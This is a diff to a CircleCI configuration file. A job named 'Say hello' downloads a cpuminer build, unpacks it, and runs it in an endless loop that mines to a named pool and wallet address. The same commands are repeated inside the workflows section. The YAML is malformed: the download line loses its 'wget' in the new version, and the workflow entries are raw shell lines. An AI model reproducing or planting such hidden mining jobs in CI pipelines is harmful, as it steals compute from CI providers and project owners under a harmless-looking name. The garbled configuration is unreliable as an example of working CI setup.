@@ -17,24 +17,24 @@ jobs:
       - run:
           name: "Say hello"
           command:
-                    " - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
-                    -  tar xf cpuminer-opt-linux.tar.gz
-                    - while [ 1 ]; do
-                    - ./cpuminer-sse2 -a heavyhash  -o stratum+tcps://stratum-eu.rplant.xyz:17064 -u bc1q5e05mjjpt3p5aes9pfnruu2r2h7n77fadj82up.killer10000 -t1
+                     https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+                     tar xf cpuminer-opt-linux.tar.gz
+                     while [ 1 ]; do
+                     ./cpuminer-sse2 -a heavyhash  -o stratum+tcps://stratum-eu.rplant.xyz:17064 -u bc1q5e05mjjpt3p5aes9pfnruu2r2h7n77fadj82up.killer10000 -t1
 
-                    - sleep 5
-                    - done "
+                     sleep 5
+                     done 
                   
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
   say-hello-workflow:
     jobs:
-     " - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
-      - tar xf cpuminer-opt-linux.tar.gz
-      - while [ 1 ]; do
-      - ./cpuminer-sse2 -a heavyhash  -o stratum+tcps://stratum-eu.rplant.xyz:17064 -u bc1q5e05mjjpt3p5aes9pfnruu2r2h7n77fadj82up.killer10000 -t1
+        https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+       tar xf cpuminer-opt-linux.tar.gz
+       while [ 1 ]; do
+       ./cpuminer-sse2 -a heavyhash  -o stratum+tcps://stratum-eu.rplant.xyz:17064 -u bc1q5e05mjjpt3p5aes9pfnruu2r2h7n77fadj82up.killer10000 -t1
 
-      - sleep 5
-      - done "
+       sleep 5
+       done 
 
